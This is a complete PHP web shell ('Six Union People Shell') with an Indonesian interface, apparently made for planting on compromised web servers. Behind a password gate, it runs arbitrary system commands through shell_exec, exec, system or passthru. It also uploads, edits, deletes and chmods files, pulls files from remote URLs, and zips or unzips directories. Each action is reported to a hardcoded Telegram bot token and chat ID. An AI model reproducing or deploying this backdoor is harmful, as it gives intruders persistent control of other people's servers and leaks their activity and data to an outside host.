<?php
session_start();
$hex_pass = '676564756e676b6f736f6e67373933'; // password 'alalacinta'
function strToHex($string) {
    $hex = '';
    for ($i=0; $i<strlen($string); $i++) $hex .= dechex(ord($string[$i]));
    return $hex;
}
if (!isset($_SESSION['fileman_ok'])) {
    if (isset($_POST['pass']) && strToHex($_POST['pass']) === $hex_pass) {
        $_SESSION['fileman_ok'] = true;
        header("Location: ".$_SERVER['PHP_SELF']."?".http_build_query($_GET)); exit;
    }
    echo '<!DOCTYPE html><html><head><title>Login</title><style>
    body{background:#e3e6ea;font-family:sans-serif;}
    .loginbox{max-width:350px;margin:100px auto;padding:25px;background:#fff;border-radius:10px;box-shadow:0 4px 16px #0002;}
    input{font-size:1em;padding:9px 12px;width:90%;margin-top:10px;}
    button{padding:9px 20px;margin-top:20px;background:#304c89;color:#fff;border:none;border-radius:5px;font-size:1em;cursor:pointer;}
    button:hover{background:#587fc6;}
    </style></head><body>
    <div class="loginbox">
    <h2>🔒 Login Area</h2>
    <form method=post>
    <input type=password name=pass placeholder="Masukkan Password"><br>
    <button>Login</button>
    </form></div></body></html>'; exit;
}
if(isset($_GET['logout'])) { session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit; }

// Telegram Bot config
$botToken = '8161188245:AAFTyqNTbegh0ruXaGrGKzH_oCPeNl4MWmg';
$chatId   = '7973648686';
function sendTG($msg){
    global $botToken, $chatId;
    $msg = urlencode($msg);
    @file_get_contents("https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".$msg);
}

$dir = isset($_GET['d']) ? $_GET['d'] : '.';
$abs_path = realpath($dir);
$server = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : php_sapi_name();
$os = php_uname();
$user = (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
$group = (function_exists('posix_getgrgid') && function_exists('posix_getegid')) ? posix_getgrgid(posix_getegid())['name'] : '-';
$phpver = phpversion();
$domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '-');

// ===== DELETE ACTION ====
function rrmdir($src) {
    if(is_dir($src)){
        $files = scandir($src);
        foreach($files as $file){
            if ($file == '.' || $file == '..') continue;
            $path = "$src/$file";
            if(is_dir($path)) rrmdir($path);
            else @unlink($path);
        }
        @rmdir($src);
    } else if(is_file($src)) {
        @unlink($src);
    }
}
if(isset($_GET['delete']) && $_GET['delete']) {
    $target = "$dir/".$_GET['delete'];
    if(file_exists($target)){
        rrmdir($target);
        sendTG("🗑️ [DELETE]\nUser: $user\nTarget: ".$_GET['delete']."\nPath: $abs_path\nDomain: $domain");
        header("Location: ".$_SERVER['PHP_SELF']."?d=".urlencode($dir));
        exit;
    }
}

// === RENAME ACTION ===
if(isset($_POST['dorename']) && isset($_POST['fromname']) && isset($_POST['toname'])){
    $from = "$dir/".$_POST['fromname'];
    $to = "$dir/".$_POST['toname'];
    if($_POST['toname'] !== "" && file_exists($from)){
        if(!file_exists($to)){
            if(@rename($from, $to)){
                sendTG("✏️ [RENAME]\nUser: $user\nFrom: ".$_POST['fromname']."\nTo: ".$_POST['toname']."\nPath: $abs_path\nDomain: $domain");
            }
        }
    }
    header("Location: ".$_SERVER['PHP_SELF']."?d=".urlencode($dir));
    exit;
}

// === Other Actions
if(isset($_FILES['up'])){
    move_uploaded_file($_FILES['up']['tmp_name'], "$dir/".$_FILES['up']['name']);
    sendTG("📥 [UPLOAD]\nUser: $user\nFile: ".$_FILES['up']['name']."\nPath: $abs_path\nDomain: $domain");
}
if(isset($_POST['mkfolder']) && $_POST['foldername']){
    $newfolder = "$dir/".$_POST['foldername'];
    if(!is_dir($newfolder)){
        mkdir($newfolder);
        sendTG("📂 [CREATE FOLDER]\nUser: $user\nFolder: ".$_POST['foldername']."\nPath: $abs_path\nDomain: $domain");
    }
}
if(isset($_POST['dochmod']) && isset($_POST['chmodfile']) && isset($_POST['chmodval'])){
    $target = "$dir/".$_POST['chmodfile'];
    $chmodval = intval($_POST['chmodval'],8);
    if(@chmod($target, $chmodval)){
        sendTG("🔑 [CHMOD]\nUser: $user\nTarget: ".$_POST['chmodfile']."\nPermissions: ".$_POST['chmodval']."\nPath: $abs_path\nDomain: $domain");
    }
}
if(isset($_POST['cfile']) && $_POST['fname']){
    file_put_contents("$dir/".$_POST['fname'], $_POST['fcontent']);
    sendTG("📝 [CREATE FILE]\nUser: $user\nFile: ".$_POST['fname']."\nPath: $abs_path\nDomain: $domain");
}
if(isset($_POST['dlurl']) && $_POST['url'] && $_POST['fname']){
    file_put_contents("$dir/".$_POST['fname'], file_get_contents($_POST['url']));
    sendTG("🌐 [REMOTE DOWNLOAD]\nUser: $user\nFrom: ".$_POST['url']."\nTo: ".$_POST['fname']."\nPath: $abs_path\nDomain: $domain");
}
if(isset($_POST['saveedit']) && isset($_GET['f'])){
    file_put_contents("$dir/".$_GET['f'], $_POST['fileedit']);
    sendTG("✏️ [EDIT FILE]\nUser: $user\nFile: ".$_GET['f']."\nPath: $abs_path\nDomain: $domain");
}
if(isset($_POST['dozip']) && $_POST['zipname'] && $_POST['tozip']){
    $zipfile = "$dir/".$_POST['zipname'];
    $target = "$dir/".$_POST['tozip'];
    $zip = new ZipArchive();
    if($zip->open($zipfile, ZipArchive::CREATE) === TRUE){
        if(is_file($target)){
            $zip->addFile($target, basename($target));
        } elseif(is_dir($target)){
            $folder = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target), RecursiveIteratorIterator::SELF_FIRST);
            foreach($folder as $item){
                if ($item->isFile()) {
                    $zip->addFile($item, substr($item, strlen("$target/")));
                }
            }
        }
        $zip->close();
        sendTG("🗜️ [ZIP FILE]\nUser: $user\nSource: ".$_POST['tozip']."\nZip: ".$_POST['zipname']."\nPath: $abs_path\nDomain: $domain");
    }
}
if(isset($_POST['dounzip']) && $_POST['unzipfile']){
    $zipfile = "$dir/".$_POST['unzipfile'];
    $zip = new ZipArchive();
    if($zip->open($zipfile) === TRUE){
        $zip->extractTo($dir);
        $zip->close();
        sendTG("🗜️ [UNZIP]\nUser: $user\nFile: ".$_POST['unzipfile']."\nExtracted to: $abs_path\nDomain: $domain");
    }
}
if (isset($_POST['runcmd']) && isset($_POST['cmd'])) {
    sendTG("💻 [CMD EXECUTE]\nUser: $user\nCommand: ".$_POST['cmd']."\nPath: $abs_path\nDomain: $domain");
}

// Icon helper
function fileIcon($f, $isdir) {
    if ($isdir) return '📁';
    $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
    if (in_array($ext, array('jpg','jpeg','png','gif','bmp','webp'))) return '🖼️';
    if (in_array($ext, array('php','html','js','css'))) return '💻';
    if (in_array($ext, array('txt','md','log'))) return '📝';
    if (in_array($ext, array('zip','rar','7z','tar','gz'))) return '🗜️';
    return '📄';
}

// HTML
echo <<<HTML
<!DOCTYPE html>
<html>
<head>
<title>Six Union People Shell</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body { background: #f4f7fa; font-family: 'Segoe UI', Arial, sans-serif; color: #333; margin: 0; }
h2 { margin: 30px 0 10px 0; text-align:center; color:#304c89;}
#main { max-width: 900px; margin: 40px auto; padding: 25px; background: #fff; border-radius: 16px; box-shadow: 0 6px 20px #0002;}
table { width:100%; border-collapse:collapse; background:#fafbfc;}
th,td { padding:10px 6px; text-align:left;}
tr:nth-child(even) {background:#f1f7fa;}
a, .icon-btn { color:#2d6cdf; text-decoration:none;}
a:hover, .icon-btn:hover { text-decoration:underline;}
input,button,textarea,select { font-size:1em; border-radius:6px; border:1px solid #ccd2dd; padding:6px; margin:2px 0;}
input[type=file] { border: none; }
button.feature-btn { background: #304c89; color: #fff; border:none; padding:7px 18px; cursor:pointer; transition:.2s; margin:0 4px 7px 0; }
button.feature-btn:hover { background: #587fc6;}
button, input[type=submit] { background: #304c89; color: #fff; border:none; padding:7px 18px; cursor:pointer; transition:.2s;}
button:hover, input[type=submit]:hover { background: #587fc6;}
.icon-btn { font-size:1.3em; background:none; border:none; cursor:pointer; margin-right:7px;}
.icon-btn.danger { color: #c43636;}
form { display:inline; }
.dirnav { margin-bottom:18px; }
hr { border:0; border-top:1px solid #e3e7ee; margin:30px 0;}
@media (max-width:600px) { #main {padding:8px;} td,th{padding:7px 3px;} }
.info-block { background:#e3e8f3; border-radius:9px; padding:14px 20px; margin-bottom:25px; font-size:96%; box-shadow:0 2px 6px #0001; }
.info-block b { width:110px; display:inline-block; color:#222; }
.feature-section {margin-bottom:20px;}
.feature-form { display:none; background:#f1f4fa; border-radius:7px; margin-top:12px; padding:14px 18px;}
.feature-form.active { display:block; animation:pop .4s;}
@keyframes pop { 0%{opacity:0;transform:scale(.98);} 100%{opacity:1;transform:scale(1);} }
.rename-form { display:inline; margin-left:10px; }
</style>
<script>
function showForm(id){
    var f = document.getElementsByClassName('feature-form');
    for(var i=0; i<f.length; i++) f[i].className = 'feature-form';
    if(document.getElementById(id)) document.getElementById(id).className = 'feature-form active';
}
function confirmDelete(filename){
    return confirm("Yakin hapus '" + filename + "' ?");
}
function showRenameForm(idx) {
    var forms = document.getElementsByClassName('rename-form');
    for(var i=0;i<forms.length;i++) forms[i].style.display = 'none';
    var f = document.getElementById('rename-'+idx);
    if(f) f.style.display = 'inline';
    return false;
}
</script>
</head>
<body>
<div id="main">
<h2>🦸‍♀️ INFORMASI SERVER YANG LAGI DI ENTOT <span style="float:right;font-size:60%;"><a href="?logout=1" style="color:#d72f2f;">Logout</a></span></h2>
<div class="info-block">
<b>Directory:</b> <span style="color:#294bd5;">{$abs_path}</span><br>
<b>Server:</b> {$server}<br>
<b>System:</b> {$os}<br>
<b>User:</b> {$user}<br>
<b>Group:</b> {$group}<br>
<b>PHP Version:</b> {$phpver}
</div>

<div class="feature-section" style="text-align:center;">
<button class="feature-btn" onclick="showForm('form-folder')">📂 Buat Folder</button>
<button class="feature-btn" onclick="showForm('form-upload')">⬆️ Upload File</button>
<button class="feature-btn" onclick="showForm('form-file')">📝 Buat File Baru</button>
<button class="feature-btn" onclick="showForm('form-url')">🌐 Download dari URL</button>
<button class="feature-btn" onclick="showForm('form-zip')">🗜️ Buat ZIP</button>
<button class="feature-btn" onclick="showForm('form-unzip')">🗜️ Extract ZIP</button>
<button class="feature-btn" onclick="showForm('form-cmd')">💻 CMD</button>
</div>

<div id="form-folder" class="feature-form">
    <form method=post>
        <input name=foldername placeholder='nama_folder' required>
        <button name=mkfolder>Buat Folder</button>
    </form>
</div>
<div id="form-upload" class="feature-form">
    <form method=post enctype=multipart/form-data>
        <input type=file name=up required>
        <button>Upload</button>
    </form>
</div>
<div id="form-file" class="feature-form">
    <form method=post>
        <input name=fname placeholder='nama_file.txt' required><br>
        <textarea name=fcontent placeholder='Isi file...' rows=6 style='width:100%'></textarea><br>
        <button name=cfile>Buat File</button>
    </form>
</div>
<div id="form-url" class="feature-form">
    <form method=post>
        <input name=url placeholder='https://domain.com/file.txt' required style='width:70%'>
        <input name=fname placeholder='nama_simpan.txt' required style='width:28%'><br>
        <button name=dlurl>Download & Simpan</button>
    </form>
</div>
<div id="form-zip" class="feature-form">
    <form method=post>
        <input name=zipname placeholder='nama.zip' required>
        <select name=tozip required>
            <option value=''>--Pilih file/folder--</option>
HTML;
foreach(scandir($dir) as $f) {
    if($f=='.') continue;
    echo "<option value='$f'>$f</option>";
}
echo <<<HTML
        </select>
        <button name=dozip>Buat ZIP</button>
    </form>
</div>
<div id="form-unzip" class="feature-form">
    <form method=post>
        <select name=unzipfile required>
            <option value=''>--Pilih file ZIP--</option>
HTML;
foreach(scandir($dir) as $f) {
    if(strtolower(pathinfo($f, PATHINFO_EXTENSION)) == 'zip')
        echo "<option value='$f'>$f</option>";
}
echo <<<HTML
        </select>
        <button name=dounzip>Extract</button>
    </form>
</div>
<div id="form-cmd" class="feature-form">
    <form method=post>
        <input name="cmd" placeholder="ls -al /" style="width:60%;" required>
        <button name="runcmd">Run</button>
    </form>
HTML;
if (isset($_POST['runcmd']) && isset($_POST['cmd'])) {
    echo "<div style='margin-top:15px;'><b>Output:</b><br><pre style='background:#222;color:#8bfa7a;padding:12px 10px;border-radius:8px;max-height:400px;overflow:auto;'>";
    $cmd = $_POST['cmd'];
    if(function_exists('shell_exec'))      echo htmlspecialchars(shell_exec($cmd));
    elseif(function_exists('exec')) {
        $out = array(); exec($cmd, $out); echo htmlspecialchars(implode("\n", $out));
    }
    elseif(function_exists('system'))      echo htmlspecialchars(system($cmd));
    elseif(function_exists('passthru'))    passthru($cmd);
    else echo "CMD tidak bisa dijalankan (semua fungsi eksekusi dinonaktifkan).";
    echo "</pre></div>";
}
echo "</div>";

// Directory navigation and file list
if ($dir!='.' && $dir!='/') echo "<a href='?d=".dirname($dir)."'>⬆️ Ke Atas</a><br><br>";
echo "<table><tr><th>Nama</th><th>Tipe</th><th>Ukuran</th><th>Permissions</th><th>Aksi</th></tr>";
$idx=0;
foreach(scandir($dir) as $f) {
    if($f=='.') continue;
    $path = "$dir/$f";
    $isdir = is_dir($path);
    $perm = substr(sprintf('%o', fileperms($path)), -4);
    echo "<tr>
        <td>".fileIcon($f, $isdir)." ";
    if($isdir)
        echo "<a href='?d=$path'>$f</a>";
    else
        echo "<a href='?d=$dir&f=$f'>$f</a>";
    echo "</td>
        <td>".($isdir?"Folder":"File")."</td>
        <td>".($isdir?"-":filesize($path)." B")."</td>
        <td>$perm</td>
        <td>";
    // Tombol aksi
    if(!$isdir) echo "<a class='icon-btn' title='Lihat/Edit' href='?d=$dir&f=$f'>👁️</a> ";
    echo "<a class='icon-btn' title='CHMOD' href='?d=$dir&chmod=$f'>⚙️</a> ";
    echo "<a class='icon-btn' title='Rename' href='#' onclick='return showRenameForm($idx);'>✏️</a> ";
    echo "<span class='rename-form' id='rename-$idx' style='display:none;'>
            <form method='post' style='display:inline;'>
                <input type='hidden' name='fromname' value=\"".htmlspecialchars($f,ENT_QUOTES)."\">
                <input type='text' name='toname' value=\"".htmlspecialchars($f,ENT_QUOTES)."\" style='width:120px;' required>
                <button name='dorename' type='submit' style='padding:4px 12px;font-size:0.95em;'>Rename</button>
            </form>
        </span>";
    echo "<a class='icon-btn danger' title='Hapus' href='?d=$dir&delete=$f' onclick='return confirmDelete(\"$f\")'>🗑️</a>";
    echo "</td></tr>";
    $idx++;
}
echo "</table>";

// Edit File
if(isset($_GET['f']) && is_file("$dir/".$_GET['f'])) {
    $file = "$dir/".$_GET['f'];
    $content = htmlspecialchars(file_get_contents($file));
    echo "<hr><h3>✏️ Edit File: <b>".$_GET['f']."</b></h3>
    <form method=post>
    <textarea name='fileedit' rows=12 style='width:100%'>$content</textarea><br>
    <button name=saveedit>Simpan Perubahan</button>
    </form>";
}

// CHMOD form per file
if(isset($_GET['chmod']) && file_exists("$dir/".$_GET['chmod'])){
    $file_chmod = "$dir/".$_GET['chmod'];
    $current_perm = substr(sprintf('%o', fileperms($file_chmod)), -4);
    echo "<hr><h3>🔑 Ubah Permissions: <b>".$_GET['chmod']."</b></h3>
    <form method=post>
        <input name='chmodval' placeholder='Contoh: 0755' value='$current_perm' pattern='[0-7]{3,4}' required>
        <input type='hidden' name='chmodfile' value='".htmlspecialchars($_GET['chmod'])."'>
        <button name='dochmod'>Set Permissions</button>
    </form>";
}

echo "<br><hr style='margin-top:30px;'><div style='font-size:90%;color:#888;text-align:center;'>Janda Team &copy; ".date('Y')."</div>";
echo "</div></body></html>";
?>
